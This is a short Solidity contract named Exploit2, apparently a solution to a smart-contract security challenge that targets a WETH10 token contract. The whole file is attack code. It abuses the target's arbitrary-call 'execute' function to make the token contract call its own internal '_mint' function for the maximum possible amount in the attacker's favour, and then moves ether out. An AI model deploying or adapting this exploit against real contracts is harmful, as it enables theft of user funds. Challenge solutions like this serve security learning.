pragma solidity ^0.8.0;

import {WETH10} from "./WETH10.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";

contract Exploit2 {
    WETH10 internal weth10;
    address immutable attacker;

    constructor(address payable weth10_, address attacker_) {
        weth10 = WETH10(weth10_);
        attacker = attacker_;
    }

    function flashBack() external payable {
        weth10.execute(
            address(weth10),
            0,
            abi.encodeWithSignature(
                "_mint(address,uint256)",
                address(this),
                type(uint256).max
            )
        );
        weth10.execute(address(this), 10, "()");
    }

    fallback() external payable {
        
    }
}
